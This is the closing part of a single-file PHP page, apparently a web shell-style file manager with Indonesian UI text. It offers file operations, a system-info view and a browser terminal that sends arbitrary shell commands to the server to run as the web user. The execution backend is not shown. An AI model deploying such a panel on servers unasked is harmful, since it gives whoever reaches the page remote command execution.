                <input type="text" id="term-input" class="term-input" autocomplete="off" spellcheck="false" autocapitalize="off" autocorrect="off" placeholder="Ketik perintah... (help, ls, pwd, whoami, cd, ...)">
            </div>
        </div>
        <div class="modal-footer">
            <div style="font-size:11px; color:var(--text-mute); font-family:'JetBrains Mono',monospace; flex:1; line-height:1.55;">
                <code style="background:rgba(255,215,0,.06); padding:1px 5px; border-radius:3px; color:var(--gold-soft);">↑↓</code> history ·
                <code style="background:rgba(255,215,0,.06); padding:1px 5px; border-radius:3px; color:var(--gold-soft);">Ctrl+L</code> clear ·
                timeout 30s · interaktif (vi/top/sudo) tidak didukung
            </div>
            <button type="button" class="btn btn-sm" onclick="termClear()">Clear</button>
            <button type="button" class="btn btn-sm" onclick="closeModal('terminal')">Close</button>
        </div>
    </div>
</div>

<!-- ============ SYSTEM INFO MODAL ============ -->
<div id="modal-sysinfo" class="modal">
    <div class="modal-content sysinfo-modal">
        <div class="modal-header">
            <div class="ficon" style="background:linear-gradient(135deg,rgba(255,215,0,.18),rgba(230,57,70,.18)); color:var(--gold); border:1px solid rgba(255,215,0,.35);">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
            </div>
            <h3>System Information</h3>
            <button class="close" onclick="closeModal('sysinfo')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body sysinfo-body">
            <div class="sysinfo-tabs" role="tablist">
                <?php $__ti = 0; foreach (array_keys($sysinfo) as $__tab): ?>
                    <button type="button" class="sysinfo-tab<?= $__ti === 0 ? ' active' : '' ?>" data-tab="sys-<?= strtolower($__tab) ?>" onclick="sysinfoTab('sys-<?= strtolower($__tab) ?>', this)"><?= htmlspecialchars($__tab) ?></button>
                <?php $__ti++; endforeach; ?>
                <button type="button" class="sysinfo-tab" data-tab="sys-extensions" onclick="sysinfoTab('sys-extensions', this)">Extensions <span class="badge"><?= count($sys_exts) ?></span></button>
            </div>

            <?php $__pi = 0; foreach ($sysinfo as $__section => $__rows): $__id = 'sys-' . strtolower($__section); ?>
                <div class="sysinfo-pane<?= $__pi === 0 ? ' active' : '' ?>" id="<?= $__id ?>">
                    <table class="sysinfo-table">
                        <tbody>
                            <?php foreach ($__rows as $__k => $__v): ?>
                                <tr>
                                    <th><?= htmlspecialchars($__k) ?></th>
                                    <td><code><?= htmlspecialchars((string)$__v) ?></code></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            <?php $__pi++; endforeach; ?>

            <div class="sysinfo-pane" id="sys-extensions">
                <div class="ext-grid">
                    <?php foreach ($sys_exts as $__ex): ?>
                        <span class="ext-chip"><?= htmlspecialchars($__ex) ?></span>
                    <?php endforeach; ?>
                </div>
            </div>
        </div>
        <div class="modal-footer">
            <div style="font-size:11px; color:var(--text-mute); font-family:'JetBrains Mono',monospace; flex:1;">
                <?= htmlspecialchars($BRAND) ?> · <?= htmlspecialchars($BRAND_SUB) ?>
            </div>
            <button type="button" class="btn" onclick="closeModal('sysinfo')">Close</button>
        </div>
    </div>
</div>

</div>

<script>
// Auto-dismiss flash message after 5s (success) / 8s (error)
(function(){
    const m = document.getElementById('flash-msg');
    if (!m) return;
    const isSuccess = m.classList.contains('success');
    setTimeout(() => {
        m.classList.add('hiding');
        setTimeout(() => m.remove(), 320);
    }, isSuccess ? 5000 : 8000);
})();

// Lock body scroll when modal open
function openModal(id) {
    document.getElementById('modal-' + id).classList.add('active');
    document.body.style.overflow = 'hidden';
}
function closeModal(id) {
    document.getElementById('modal-' + id).classList.remove('active');
    if (!document.querySelector('.modal.active')) document.body.style.overflow = '';
}
function sysinfoTab(paneId, btn) {
    document.querySelectorAll('.sysinfo-pane').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.sysinfo-tab').forEach(t => t.classList.remove('active'));
    const pane = document.getElementById(paneId); if (pane) pane.classList.add('active');
    if (btn) btn.classList.add('active');
}
function renamePrompt(name) {
    document.getElementById('rename-old').value = name;
    document.getElementById('rename-old-view').value = name;
    document.getElementById('rename-new').value = name;
    openModal('rename');
    setTimeout(() => document.getElementById('rename-new').select(), 50);
}
function deletePrompt(name) {
    document.getElementById('delete-name').value = name;
    document.getElementById('delete-name-view').textContent = name;
    openModal('delete');
}
function chmodPrompt(name, perms) {
    document.getElementById('chmod-name').value = name;
    document.getElementById('chmod-name-view').value = name;
    document.getElementById('chmod-perms').value = perms;
    openModal('chmod');
}
function unzipPrompt(name) {
    document.getElementById('unzip-name').value = name;
    document.getElementById('unzip-name-view').value = name;
    document.getElementById('unzip-to').value = name.replace(/\.zip$/i, '');
    openModal('unzip');
}

// ============ BULK SELECTION ============
function getSelectedNames() {
    return Array.from(document.querySelectorAll('.sel:checked')).map(c => c.value);
}
function updateBulk() {
    const names = getSelectedNames();
    const bar = document.getElementById('bulk-bar');
    document.getElementById('sel-count').textContent = names.length;
    if (names.length > 0) bar.classList.add('active');
    else bar.classList.remove('active');
    // toggle selected row highlight
    document.querySelectorAll('#tbody tr').forEach(tr => {
        const cb = tr.querySelector('.sel');
        if (cb) tr.classList.toggle('selected', cb.checked);
    });
    // sync select-all state
    const all = document.querySelectorAll('.sel');
    const checked = document.querySelectorAll('.sel:checked');
    const sa = document.getElementById('select-all');
    if (sa) {
        sa.checked = all.length > 0 && all.length === checked.length;
        sa.indeterminate = checked.length > 0 && checked.length < all.length;
    }
}
function toggleAll(master) {
    document.querySelectorAll('.sel').forEach(c => c.checked = master.checked);
    // mirror to grid
    document.querySelectorAll('.sel-grid').forEach(g => {
        const match = document.querySelector('.sel[value="' + CSS.escape(g.value) + '"]');
        if (match) g.checked = match.checked;
        const card = g.closest('.card');
        if (card) card.classList.toggle('selected', g.checked);
    });
    updateBulk();
}
function syncGridSel(grid) {
    const match = document.querySelector('.sel[value="' + CSS.escape(grid.value) + '"]');
    if (match) match.checked = grid.checked;
    const card = grid.closest('.card');
    if (card) card.classList.toggle('selected', grid.checked);
}
function clearSel() {
    document.querySelectorAll('.sel, .sel-grid').forEach(c => c.checked = false);
    document.querySelectorAll('.card.selected').forEach(c => c.classList.remove('selected'));
    updateBulk();
}
function openBulkDelete() {
    const names = getSelectedNames();
    if (!names.length) return;
    document.getElementById('bd-count').textContent = names.length;
    document.getElementById('bd-list').innerHTML = names.map(n => '• ' + escapeHtml(n)).join('<br>');
    openModal('bulk-delete');
}
function openBulkZip() {
    const names = getSelectedNames();
    if (!names.length) return;
    document.getElementById('zip-count').textContent = names.length;
    document.getElementById('zip-list').innerHTML = names.map(n => '• ' + escapeHtml(n)).join('<br>');
    const ts = new Date().toISOString().slice(0,19).replace(/[:-]/g,'').replace('T','-');
    document.getElementById('zip-name-input').value = 'archive-' + ts + '.zip';
    openModal('zip');
    setTimeout(() => document.getElementById('zip-name-input').select(), 50);
}
function submitBulk(action) {
    document.getElementById('bulk-action').value = action;
    document.getElementById('bulk-form').submit();
}
function submitZip() {
    const name = document.getElementById('zip-name-input').value.trim();
    if (!name) { alert('Nama file zip tidak boleh kosong'); return; }
    document.getElementById('bulk-zipname').value = name;
    submitBulk('zip');
}
function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

// ============ BREADCRUMB EDIT ============
function toggleCrumbEdit(on) {
    const bc = document.getElementById('breadcrumb');
    if (!bc) return;
    bc.classList.toggle('editing', on);
    if (on) {
        const inp = document.getElementById('crumb-input');
        inp.focus();
        inp.select();
    }
}
// Double-click breadcrumb path area to edit
(function(){
    const wrap = document.getElementById('crumb-wrap');
    if (wrap) wrap.addEventListener('dblclick', () => toggleCrumbEdit(true));
    const input = document.getElementById('crumb-input');
    if (input) input.addEventListener('keydown', e => {
        if (e.key === 'Escape') toggleCrumbEdit(false);
    });
})();
document.querySelectorAll('.modal').forEach(m => {
    m.addEventListener('click', e => {
        if (e.target === m) {
            m.classList.remove('active');
            if (!document.querySelector('.modal.active')) document.body.style.overflow = '';
        }
    });
});
document.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal.active').forEach(m => m.classList.remove('active'));
        document.body.style.overflow = '';
    }
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        const s = document.getElementById('search'); if (s) s.focus();
    }
    if ((e.ctrlKey || e.metaKey) && e.key === 's') {
        const ta = document.querySelector('.editor-body textarea');
        if (ta) { e.preventDefault(); ta.closest('form').submit(); }
    }
});

// Swipe-down to close modal on mobile
document.querySelectorAll('.modal-content').forEach(c => {
    let startY = null, currentY = 0;
    c.addEventListener('touchstart', e => {
        if (c.scrollTop > 0) return;
        startY = e.touches[0].clientY;
    }, {passive:true});
    c.addEventListener('touchmove', e => {
        if (startY === null) return;
        currentY = e.touches[0].clientY - startY;
        if (currentY > 0) { c.style.transform = 'translateY(' + currentY + 'px)'; c.style.transition = 'none'; }
    }, {passive:true});
    c.addEventListener('touchend', () => {
        if (startY === null) return;
        c.style.transition = '';
        if (currentY > 120) {
            const m = c.closest('.modal');
            if (m) { m.classList.remove('active'); document.body.style.overflow = ''; }
        }
        c.style.transform = '';
        startY = null; currentY = 0;
    });
});

// search
const search = document.getElementById('search');
if (search) {
    search.addEventListener('input', () => {
        const q = search.value.toLowerCase();
        document.querySelectorAll('#tbody tr, #grid-body .card').forEach(el => {
            el.style.display = el.dataset.name.includes(q) ? '' : 'none';
        });
    });
}

// view toggle
function setView(v) {
    const lv = document.getElementById('list-view');
    const gv = document.getElementById('grid-view');
    const bl = document.getElementById('view-list');
    const bg = document.getElementById('view-grid');
    if (!lv || !gv) return;
    if (v === 'grid') {
        lv.style.display='none'; gv.style.display=''; bg.classList.add('active'); bl.classList.remove('active');
    } else {
        lv.style.display=''; gv.style.display='none'; bl.classList.add('active'); bg.classList.remove('active');
    }
    try { localStorage.setItem('fm_view', v); } catch(e) {}
}
try { const v = localStorage.getItem('fm_view'); if (v) setView(v); } catch(e) {}

// upload drop & list
const drop = document.getElementById('drop-zone');
const fileInput = document.getElementById('file-input');
const fileList = document.getElementById('file-list');
if (drop && fileInput) {
    ['dragenter','dragover'].forEach(ev => drop.addEventListener(ev, e => {
        e.preventDefault(); drop.classList.add('drag');
    }));
    ['dragleave','drop'].forEach(ev => drop.addEventListener(ev, e => {
        e.preventDefault(); drop.classList.remove('drag');
    }));
    drop.addEventListener('drop', e => { fileInput.files = e.dataTransfer.files; renderFiles(); });
    fileInput.addEventListener('change', renderFiles);
    function renderFiles() {
        fileList.innerHTML = '';
        [...fileInput.files].forEach(f => {
            const d = document.createElement('div');
            d.textContent = '📎 ' + f.name + ' (' + (f.size / 1024).toFixed(1) + ' KB)';
            fileList.appendChild(d);
        });
    }
}

// ============ TERMINAL ============
let termCwd = <?= json_encode(str_replace('\\', '/', $SCRIPT_DIR)) ?>;
let termHistory = [];
let termHistoryIdx = 0;
let termBusy = false;

try {
    const saved = localStorage.getItem('fm_term_history');
    if (saved) termHistory = JSON.parse(saved) || [];
    termHistoryIdx = termHistory.length;
} catch(e) {}

function termPromptStr() {
    const parts = termCwd.split('/').filter(Boolean);
    return (parts.length > 3 ? '…/' + parts.slice(-3).join('/') : termCwd) + ' $';
}
function updateTermPrompt() {
    const p = document.getElementById('term-prompt');
    if (p) { p.textContent = termPromptStr(); p.title = termCwd; }
}
function termAppend(html) {
    const o = document.getElementById('term-output');
    if (!o) return;
    o.insertAdjacentHTML('beforeend', html);
    o.scrollTop = o.scrollHeight;
}
function termClear() {
    const o = document.getElementById('term-output');
    if (o) o.innerHTML = '';
}
function termSetBusy(b) {
    termBusy = b;
    const s = document.getElementById('term-status');
    if (!s) return;
    s.classList.toggle('busy', b);
    s.innerHTML = '<span class="dot"></span> ' + (b ? 'running' : 'ready');
}
function openTerminal() {
    openModal('terminal');
    updateTermPrompt();
    const out = document.getElementById('term-output');
    if (out && !out.dataset.init) {
        out.dataset.init = '1';
        termAppend(
            '<div class="term-welcome">' +
            '<b>⚜ Terminal Ready</b><br>' +
            'Current dir: <b>' + escapeHtml(termCwd) + '</b><br>' +
            'Ketik <code>help</code> untuk tips · <code>clear</code> untuk bersihkan · <code>↑↓</code> untuk history' +
            '</div>'
        );
    }
    termHistoryIdx = termHistory.length;
    setTimeout(() => { const i = document.getElementById('term-input'); if (i) i.focus(); }, 120);
}

async function termExec(cmd) {
    if (termBusy) return;
    termAppend(
        '<div class="term-line">' +
        '<span class="term-prompt-inline">' + escapeHtml(termPromptStr()) + ' </span>' +
        '<span class="term-cmd">' + escapeHtml(cmd) + '</span>' +
        '</div>'
    );
    const t = cmd.trim();
    if (!t) return;

    // history
    if (termHistory[termHistory.length - 1] !== cmd) {
        termHistory.push(cmd);
        if (termHistory.length > 200) termHistory.shift();
        try { localStorage.setItem('fm_term_history', JSON.stringify(termHistory)); } catch(e) {}
    }
    termHistoryIdx = termHistory.length;

    // client-side built-ins
    if (t === 'clear' || t === 'cls') { termClear(); return; }
    if (t === 'help' || t === '?') {
        termAppend('<div class="term-out">' + [
            'Tips penggunaan:',
            '  <b>cd &lt;dir&gt;</b>    — pindah folder (dilacak client-side, persist antar command)',
            '  <b>cd</b> / <b>cd ~</b>   — pindah ke HOME',
            '  <b>pwd</b>          — tampilkan folder saat ini',
            '  <b>ls</b> / <b>dir</b>    — list file',
            '  <b>whoami</b>       — user runtime PHP (biasanya www-data/apache)',
            '  <b>history</b>      — riwayat perintah',
            '  <b>clear</b> / <b>cls</b> — bersihkan output',
            '  <b>↑ / ↓</b>        — navigasi history',
            '  <b>Ctrl+L</b>       — clear',
            '  <b>Ctrl+C</b>       — batalkan input (bukan kill proses)',
            '',
            'Catatan:',
            '  • Timeout per command: 30 detik',
            '  • Command interaktif (vi, nano, top, sudo, mysql -p) <b>tidak didukung</b>',
            '  • stderr digabung ke stdout',
            '  • ANSI color codes di-strip otomatis',
        ].map(s => s.replace(/<b>(.*?)<\/b>/g, '<b style="color:var(--gold);">$1</b>')).join('\n') + '</div>');
        return;
    }
    if (t === 'history') {
        if (!termHistory.length) { termAppend('<div class="term-out">(history kosong)</div>'); return; }
        const lines = termHistory.map((h, i) => String(i + 1).padStart(4) + '  ' + h);
        termAppend('<div class="term-out">' + escapeHtml(lines.join('\n')) + '</div>');
        return;
    }

    termSetBusy(true);
    try {
        const fd = new FormData();
        fd.append('action', 'term_exec');
        fd.append('cmd', cmd);
        fd.append('term_cwd', termCwd);
        const r = await fetch(location.pathname, {
            method: 'POST', body: fd, credentials: 'same-origin',
            headers: { 'X-Requested-With': 'XMLHttpRequest' }
        });
        const text = await r.text();
        let j;
        try { j = JSON.parse(text); }
        catch(e) {
            termAppend('<div class="term-err">⚠ Response bukan JSON (session expired?). Raw:\n' + escapeHtml(text.slice(0, 500)) + '</div>');
            return;
        }
        if (j.error) termAppend('<div class="term-err">⚠ ' + escapeHtml(j.error) + '</div>');
        if (j.output !== '' && j.output != null) {
            const cls = (j.exit && j.exit !== 0) ? 'term-err' : 'term-out';
            termAppend('<div class="' + cls + '">' + escapeHtml(j.output) + '</div>');
        }
        if (j.exit && j.exit !== 0 && !j.error) {
            termAppend('<div class="term-exit-err">[exit ' + j.exit + ']</div>');
        }
        if (j.cwd) { termCwd = j.cwd; updateTermPrompt(); }
    } catch(e) {
        termAppend('<div class="term-err">Network error: ' + escapeHtml(e.message) + '</div>');
    } finally {
        termSetBusy(false);
        const i = document.getElementById('term-input');
        if (i) i.focus();
    }
}

(function initTerminal(){
    const inp = document.getElementById('term-input');
    if (!inp) return;
    inp.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
            e.preventDefault();
            const cmd = inp.value;
            inp.value = '';
            termExec(cmd);
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (termHistoryIdx > 0) {
                termHistoryIdx--;
                inp.value = termHistory[termHistoryIdx] || '';
                setTimeout(() => inp.setSelectionRange(inp.value.length, inp.value.length), 0);
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (termHistoryIdx < termHistory.length - 1) {
                termHistoryIdx++;
                inp.value = termHistory[termHistoryIdx] || '';
            } else {
                termHistoryIdx = termHistory.length;
                inp.value = '';
            }
        } else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'l') {
            e.preventDefault();
            termClear();
        } else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'c' && !window.getSelection().toString()) {
            e.preventDefault();
            termAppend(
                '<div class="term-line">' +
                '<span class="term-prompt-inline">' + escapeHtml(termPromptStr()) + ' </span>' +
                '<span class="term-cmd">' + escapeHtml(inp.value) + '</span>' +
                '<span class="term-err">^C</span></div>'
            );
            inp.value = '';
            termHistoryIdx = termHistory.length;
        }
    });
    // Fokus input saat klik di area terminal
    const wrap = document.getElementById('terminal-wrap');
    if (wrap) wrap.addEventListener('click', e => {
        if (!e.target.closest('input, button, a, .term-output')) {
            setTimeout(() => inp.focus(), 0);
        }
    });
})();
</script>
</body>
</html>
